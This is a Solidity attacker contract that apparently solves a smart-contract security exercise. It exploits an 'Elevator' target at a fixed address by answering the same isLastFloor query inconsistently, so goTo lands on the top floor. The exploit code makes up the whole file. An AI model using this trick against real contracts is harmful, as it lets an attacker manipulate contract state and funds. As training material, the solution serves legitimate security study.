// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IElevator {
    function goTo(uint256 _floor) external;
}
contract Attacker {

    IElevator target = IElevator(0xE5B03e998084105e44E4EAb40f86654894B9444d);

    uint private counter = 0;

    function isLastFloor(uint256 floor) public returns (bool) {
        floor;
        return ++counter % 2 == 0;
    }

    function attack() public {
        target.goTo(1);
    }
}
